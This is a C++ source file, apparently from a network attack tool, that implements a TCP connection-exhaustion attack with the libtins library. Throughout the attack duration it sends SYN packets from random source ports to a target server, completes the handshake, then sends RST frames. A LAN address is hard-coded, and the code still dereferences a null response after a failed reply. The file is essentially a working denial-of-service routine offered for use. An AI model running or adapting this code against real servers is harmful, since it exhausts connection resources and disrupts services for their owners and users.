//
// Created by zhf on 2024/11/8.
//

#include <iostream>
#include "common.h"
#include "connection.h"
#include "utils.h"

void connection_exhausted_attack() {

    // 起始时间
    auto start_time = std::chrono::steady_clock::now();

    // 创建 ip (目的地址)
    while(true) {
        // 当前时间
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(current_time -start_time).count();

        if(elapsed_time > globalArgs.commandArgs.attackDuration){
            printf("攻击结束\n");
            break;
        }

        // 创建攻击者随机端口
        int attacker_port = get_random_number();
        Tins:: IP ip_packet = Tins::IP(globalArgs.commandArgs.serverIp) / Tins::TCP(globalArgs.commandArgs.serverPort, attacker_port);

        // 创建 tcp 包
        auto & tcp = ip_packet.rfind_pdu<Tins::TCP>();
        // 设置 SYN 标记
        tcp.set_flag(Tins::TCP::SYN, 1);
        // 向服务端进行发送
        std::unique_ptr<Tins::PDU> response(globalArgs.packetSender.send_recv(ip_packet));
        if(!response){
            std::cout << "no response" << std::endl;
//            exit(-1);
        }
        auto& tcp_response = response->rfind_pdu<Tins::TCP>();
        if(!(tcp_response.get_flag(Tins::TCP::SYN) && (tcp_response.get_flag(Tins::TCP::ACK)))) {
            std::cout << "didn't get syn ack" << std::endl;
//            exit(-1);
        }
        else {
            std::cout << "attacker server connection established" << std::endl;
        }
        uint32_t seq_response = tcp_response.seq();
        tcp.ack_seq(seq_response+1);
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::SYN, 0);
        tcp.set_flag(Tins::TCP::Flags::ACK, 1);
        globalArgs.packetSender.send(ip_packet);
        tcp.seq(1); // because the first one was 0
        tcp.set_flag(Tins::TCP::Flags::RST, 1);
        // 这里由于需要发送的是 RST 包, 所以需要 MAC 地址
        MACAddress serverMAC = Tins::Utils::resolve_hwaddr("192.168.0.49", globalArgs.packetSender);
        MACAddress localMac = globalArgs.interface.addresses().hw_addr;
        Tins::EthernetII ethPacket = Tins::EthernetII(serverMAC, localMac) / ip_packet;
        globalArgs.packetSender.send(ethPacket);
    }

}